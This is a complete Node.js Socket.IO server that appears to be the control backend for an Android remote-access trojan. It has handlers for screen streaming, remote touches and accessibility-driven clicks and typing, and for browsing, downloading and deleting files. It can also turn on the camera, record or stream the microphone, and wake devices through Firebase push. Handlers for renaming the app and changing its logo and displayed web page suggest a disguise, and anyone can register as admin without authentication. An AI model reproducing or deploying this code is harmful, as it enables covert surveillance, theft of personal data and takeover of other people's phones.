const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { GoogleAuth } = require('google-auth-library');
const fs = require('fs');
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const TOKEN_FILE = './fcm_tokens.json';

function loadTokenStore() {
  try {
    if (fs.existsSync(TOKEN_FILE)) {
      return JSON.parse(fs.readFileSync(TOKEN_FILE, 'utf8'));
    }
  } catch (e) {
    console.error('Token load error:', e);
  }
  return {};
}

function saveTokenStore() {
  try {
    fs.writeFileSync(TOKEN_FILE, JSON.stringify(fcmTokenStore, null, 2));
  } catch (e) {
    console.error('Token save error:', e);
  }
}

let clients = {};
let admins = {};
let fcmTokenStore = loadTokenStore();

async function getFCMAccessToken() {
  let credentials;
  if (process.env.FIREBASE_CREDENTIALS) {
    credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS);
  } else {
    credentials = JSON.parse(
      fs.readFileSync('/etc/secrets/firebase-service-account.json', 'utf8')
    );
  }
  const auth = new GoogleAuth({
    credentials: credentials,
    scopes: ['https://www.googleapis.com/auth/firebase.messaging']
  });
  const client = await auth.getClient();
  const token = await client.getAccessToken();
  return token.token;
}

async function sendFCMNotification(fcmToken) {
  try {
    const accessToken = await getFCMAccessToken();
    const response = await fetch(
      'https://fcm.googleapis.com/v1/projects/remoteclient-361ff/messages:send',
      {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          message: {
            token: fcmToken,
            data: { action: 'WAKE_UP' },
            android: { priority: 'high' }
          }
        })
      }
    );
    const result = await response.json();
    console.log('FCM sent:', result);
    return result;
  } catch (e) {
    console.error('FCM error:', e);
  }
}

io.on('connection', (socket) => {

  socket.on('register_client', (data) => {
    clients[socket.id] = {
      id: socket.id,
      name: data.name,
      device: data.device,
      battery: data.battery || 0,
      network: data.network || 'unknown',
      isCharging: data.isCharging || false
    };
    console.log('Client connected:', data.name);
    broadcastClientList();
  });

  socket.on('client_info', (data) => {
    if (clients[socket.id]) {
      clients[socket.id].battery = data.battery;
      clients[socket.id].network = data.network;
      clients[socket.id].isCharging = data.isCharging;
      broadcastClientList();
    }
  });

  socket.on('register_fcm_token', (data) => {
    if (clients[socket.id]) {
      clients[socket.id].fcmToken = data.token;
      fcmTokenStore[data.token] = {
        token: data.token,
        name: clients[socket.id].name,
        device: clients[socket.id].device,
        lastSeen: new Date().toISOString()
      };
      saveTokenStore();
      broadcastOfflineDevices();
      console.log('FCM token stored:', clients[socket.id].name);
    }
  });

  socket.on('wake_client', async (data) => {
    const fcmToken = data.token;
    if (fcmToken) {
      await sendFCMNotification(fcmToken);
      socket.emit('wake_result', { success: true });
    } else {
      socket.emit('wake_result', { success: false, error: 'No token' });
    }
  });

  socket.on('register_admin', () => {
    admins[socket.id] = true;
    socket.emit('client_list', Object.values(clients));
    broadcastOfflineDevices();
    console.log('Admin connected');
  });

  socket.on('request_screen', (clientId) => {
    io.to(clientId).emit('start_screen');
  });

  socket.on('stop_screen', (clientId) => {
    io.to(clientId).emit('stop_screen');
  });

  socket.on('screen_data', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('screen_frame', {
        clientId: socket.id,
        frame: data.frame
      });
    });
  });

  socket.on('touch_event', (data) => {
    io.to(data.clientId).emit('perform_touch', {
      x: data.x, y: data.y, action: data.action
    });
  });

  socket.on('perform_swipe', (data) => {
    io.to(data.clientId).emit('perform_swipe', {
      startX: data.startX, startY: data.startY,
      endX: data.endX, endY: data.endY,
      duration: data.duration || 300
    });
  });

  socket.on('press_back',          (data) => io.to(data.clientId).emit('press_back'));
  socket.on('press_home',          (data) => io.to(data.clientId).emit('press_home'));
  socket.on('press_recents',       (data) => io.to(data.clientId).emit('press_recents'));
  socket.on('press_notifications', (data) => io.to(data.clientId).emit('press_notifications'));

  socket.on('launch_app', (data) => {
    io.to(data.clientId).emit('launch_app', { package: data.package });
  });

  socket.on('get_app_list', (clientId) => {
    io.to(clientId).emit('get_app_list');
  });

  socket.on('app_list', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('app_list', { clientId: socket.id, apps: data.apps });
    });
  });

  socket.on('file_transfer', (data) => {
    io.to(data.clientId).emit('file_receive', {
      fileName: data.fileName, fileData: data.fileData, mimeType: data.mimeType
    });
  });

  socket.on('file_received', (data) => {
    Object.keys(admins).forEach(adminId => io.to(adminId).emit('file_received', data));
  });

  socket.on('request_media_permission', (clientId) => {
    io.to(clientId).emit('request_media_permission');
  });

  // ─── File Manager ────────────────────────────────────────────────────────

  socket.on('get_file_list', (data) => {
    io.to(data.clientId).emit('get_file_list', { path: data.path });
  });

  socket.on('file_list_result', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('file_list_result', { clientId: socket.id, path: data.path, files: data.files });
    });
  });

  socket.on('download_file', (data) => {
    io.to(data.clientId).emit('download_file', { path: data.path });
  });

  socket.on('file_download_result', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('file_download_result', { clientId: socket.id, ...data });
    });
  });

  socket.on('delete_file', (data) => {
    io.to(data.clientId).emit('delete_file', { path: data.path });
  });

  socket.on('delete_file_result', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('delete_file_result', { clientId: socket.id, ...data });
    });
  });

  // ─── Media Viewer ────────────────────────────────────────────────────────

  socket.on('get_media_list', (data) => {
    io.to(data.clientId).emit('get_media_list', { type: data.type });
  });

  socket.on('media_list_result', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('media_list_result', { clientId: socket.id, type: data.type, files: data.files });
    });
  });

  socket.on('get_media_file', (data) => {
    io.to(data.clientId).emit('get_media_file', { path: data.path });
  });

  socket.on('media_file_result', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('media_file_result', { clientId: socket.id, ...data });
    });
  });

  // ─── Camera ──────────────────────────────────────────────────────────────

  socket.on('start_camera', (data) => {
    io.to(data.clientId).emit('start_camera', { facing: data.facing });
  });

  socket.on('stop_camera',   (data) => io.to(data.clientId).emit('stop_camera'));

  socket.on('camera_frame', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('camera_frame', { clientId: socket.id, frame: data.frame });
    });
  });

  socket.on('switch_camera', (data) => {
    io.to(data.clientId).emit('switch_camera', { facing: data.facing });
  });

  // ─── Audio ───────────────────────────────────────────────────────────────

  socket.on('start_audio_record', (data) => {
    io.to(data.clientId).emit('start_audio_record', { duration: data.duration });
  });

  socket.on('stop_audio_record',  (data) => io.to(data.clientId).emit('stop_audio_record'));

  socket.on('audio_record_result', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('audio_record_result', { clientId: socket.id, ...data });
    });
  });

  socket.on('audio_record_progress', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('audio_record_progress', { clientId: socket.id, remaining: data.remaining });
    });
  });

  socket.on('start_audio_stream', (data) => io.to(data.clientId).emit('start_audio_stream'));
  socket.on('stop_audio_stream',  (data) => io.to(data.clientId).emit('stop_audio_stream'));

  socket.on('audio_stream_chunk', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('audio_stream_chunk', { clientId: socket.id, chunk: data.chunk, sampleRate: data.sampleRate });
    });
  });

  // ─── Branding ────────────────────────────────────────────────────────────

  socket.on('set_webview_url', (data) => {
    io.to(data.clientId).emit('set_webview_url', { url: data.url });
  });

  socket.on('set_app_branding', (data) => {
    io.to(data.clientId).emit('set_app_branding', { name: data.name, logoUrl: data.logoUrl });
  });

  // ─── Accessibility: existing ──────────────────────────────────────────────

  socket.on('get_accessibility_info', (data) => {
    io.to(data.clientId).emit('get_accessibility_info');
  });

  socket.on('accessibility_info', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('accessibility_info', {
        clientId: socket.id,
        ...JSON.parse(JSON.stringify(data))
      });
    });
  });

  socket.on('accessibility_click', (data) => {
    io.to(data.clientId).emit('accessibility_click', {
      centerX: data.centerX,
      centerY: data.centerY
    });
  });

  socket.on('accessibility_type', (data) => {
    io.to(data.clientId).emit('accessibility_type', {
      text: data.text,
      centerX: data.centerX,
      centerY: data.centerY
    });
  });

  // ─── Accessibility: NEW ───────────────────────────────────────────────────

  // Long press on element
  socket.on('accessibility_longpress', (data) => {
    io.to(data.clientId).emit('accessibility_longpress', {
      centerX: data.centerX,
      centerY: data.centerY
    });
  });

  // Scroll on specific element
  socket.on('accessibility_scroll', (data) => {
    io.to(data.clientId).emit('accessibility_scroll', {
      centerX:   data.centerX,
      centerY:   data.centerY,
      direction: data.direction
    });
  });

  // Scroll result feedback
  socket.on('accessibility_scroll_result', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('accessibility_scroll_result', {
        clientId: socket.id,
        ...data
      });
    });
  });

  // Screenshot for Overlay tab
  socket.on('get_screenshot', (data) => {
    io.to(data.clientId).emit('get_screenshot', {});
  });

  // Screenshot result — last captured frame
  socket.on('screenshot_result', (data) => {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('screenshot_result', {
        clientId: socket.id,
        frame: data.frame
      });
    });
  });

  // ─── Disconnect ───────────────────────────────────────────────────────────

  socket.on('disconnect', () => {
    if (clients[socket.id]) {
      const client = clients[socket.id];
      if (client.fcmToken) {
        fcmTokenStore[client.fcmToken].lastSeen = new Date().toISOString();
        saveTokenStore();
      }
    }
    delete clients[socket.id];
    delete admins[socket.id];
    broadcastClientList();
    broadcastOfflineDevices();
    console.log('Disconnected:', socket.id);
  });

  function broadcastClientList() {
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('client_list', Object.values(clients));
    });
  }

  function broadcastOfflineDevices() {
    const onlineTokens = new Set(
      Object.values(clients)
        .map(c => c.fcmToken)
        .filter(t => t != null && t !== '')
    );
    const offlineDevices = Object.values(fcmTokenStore).filter(
      d => !onlineTokens.has(d.token)
    );
    Object.keys(admins).forEach(adminId => {
      io.to(adminId).emit('offline_devices', offlineDevices);
    });
  }
});

app.get('/', (req, res) => {
  res.send('Remote Server Running ✅');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
